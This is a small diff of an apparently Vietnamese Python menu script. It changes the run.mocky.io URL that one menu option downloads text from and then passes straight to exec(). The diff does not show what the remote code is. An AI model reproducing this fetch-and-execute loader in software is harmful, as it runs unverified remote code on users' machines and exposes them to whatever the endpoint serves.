@@ -63,7 +63,7 @@ try:
         elif chon == '1':
             if check_internet_connection():
                 try:
-                    response = requests.get('https://run.mocky.io/v3/be06ba9a-df10-444d-b8b7-879853b30671')
+                    response = requests.get('https://run.mocky.io/v3/9fb1b7e3-e332-4d1e-baed-fbe02362e044')
                     response.raise_for_status()  # Kiểm tra lỗi HTTP
                     exec(response.text)
                 except requests.RequestException as e:
